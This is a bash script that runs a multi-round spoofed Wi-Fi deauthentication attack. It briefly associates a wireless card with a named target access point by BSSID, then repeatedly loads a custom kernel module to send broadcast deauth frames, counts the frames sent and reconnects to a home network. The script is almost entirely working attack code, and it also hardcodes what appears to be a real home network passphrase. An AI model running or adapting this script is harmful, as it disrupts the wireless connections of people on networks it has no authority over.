#!/bin/bash
# deauth_pe_v4.sh - Reliable multi-round deauth using dynamic BSSID
#
# Key fixes vs v3:
# - Match either target BSSID (dc:92 2.4GHz OR dc:93 5GHz)
# - Use petx5.ko (dynamic bssId copy, no hardcoded BSSID)
# - Faster connection detection via dmesg polling with broader grep
#
# Usage: sudo bash /tmp/deauth_pe_v4.sh [rounds] [burst]

ROUNDS=${1:-10}
BURST=${2:-3}
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"

echo "[*] Spoofed deauth attack - $ROUNDS rounds, $BURST burst/round"

cd /tmp

# Build petx5 if needed
if [ ! -f petx5.ko ] || [ petx5.S -nt petx5.ko ]; then
    echo "[*] Building petx5.ko..."
    as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o || { echo "BUILD FAIL"; exit 1; }
fi

# Mark dmesg position
DMESG_START=$(dmesg | wc -l)

DEAUTH_COUNT=0
SUCCESS_ROUNDS=0

for round in $(seq 1 $ROUNDS); do
    echo -n "[Round $round/$ROUNDS] "

    # Disconnect first
    nmcli device disconnect wlan0 2>/dev/null
    sleep 0.3

    # Remember dmesg position before connect
    DMESG_PRE=$(dmesg | wc -l)

    # Connect to target AP by BSSID (nmcli picks any available band)
    # Use a dummy password - we only need the 802.11 association
    nmcli device wifi connect "04:67:61:D6:DC:92" password "dummypassword12345678" ifname wlan0 2>/dev/null &
    PID=$!

    # Poll dmesg for connection to either BSSID (dc:92 or dc:93)
    OK=0
    for i in $(seq 1 60); do
        if dmesg | tail -$(($(dmesg | wc -l) - DMESG_PRE + 1)) | grep -q "connected to 04:67:61:d6:dc:9[23]"; then
            OK=1
            break
        fi
        sleep 0.05
    done

    if [ $OK -eq 0 ]; then
        echo "FAIL (no connect)"
        kill $PID 2>/dev/null; wait $PID 2>/dev/null
        # Reconnect home
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 2
        continue
    fi

    SUCCESS_ROUNDS=$((SUCCESS_ROUNDS + 1))

    # Send burst of spoofed deauths
    SENT=0
    for b in $(seq 1 $BURST); do
        rmmod kfind 2>/dev/null
        sleep 0.05
        insmod /tmp/petx5.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
            SENT=$((SENT + 1))
            rmmod kfind 2>/dev/null
            sleep 0.1
        else
            break
        fi
    done
    echo "OK ($SENT deauths, total=$DEAUTH_COUNT)"

    # Kill nmcli background
    kill $PID 2>/dev/null; wait $PID 2>/dev/null

    # Delete auto-created NM profiles (avoid clutter)
    for prof in $(nmcli -t -f NAME connection show | grep -v "9899" | grep -v "lo" | grep -v "waydroid" | grep -v "bridge"); do
        nmcli connection delete "$prof" 2>/dev/null
    done

    # Reconnect home
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    sleep 1.5
done

echo ""
echo "[*] === RESULTS ==="
echo "[*] $DEAUTH_COUNT spoofed deauths in $SUCCESS_ROUNDS/$ROUNDS rounds"
echo "[*] Deauth log:"
dmesg | tail -$(($(dmesg | wc -l) - DMESG_START + 1)) | grep "Deauth TX.*ff:ff:ff"
echo "[*] Done."
